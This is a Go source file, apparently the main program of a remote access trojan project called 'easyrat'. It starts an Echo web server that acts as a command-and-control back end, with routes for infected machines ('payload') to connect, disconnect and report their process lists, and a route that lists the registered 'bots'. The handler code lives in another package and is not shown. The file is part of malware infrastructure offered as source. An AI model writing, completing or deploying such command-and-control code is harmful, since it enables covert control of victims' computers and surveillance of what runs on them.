package main

import (
	"easyrat/utils"
	"fmt"

	"github.com/labstack/echo"
	"github.com/labstack/echo/middleware"
)

const (
	port = 5618
)

func main() {
	// Initialize database
	utils.ConnectDB()

	// Initialize server
	e := echo.New()
	e.HideBanner = true
	e.Use(middleware.CORSWithConfig(middleware.CORSConfig{
		AllowOrigins: []string{"*"},
		AllowHeaders: []string{echo.HeaderOrigin, echo.HeaderContentType, echo.HeaderAccept},
	}))

	// Routes
	e.GET("/status", utils.RStatus)
	e.GET("/payload/disconnect", utils.RDisconnect)
	e.GET("/server/bots", utils.RGetBots)
	e.POST("/payload/connect", utils.RConnect)
	e.POST("/payload/proclist", utils.RProcList)

	// Run server
	e.Logger.Fatal(e.Start(":" + fmt.Sprint(port)))
}
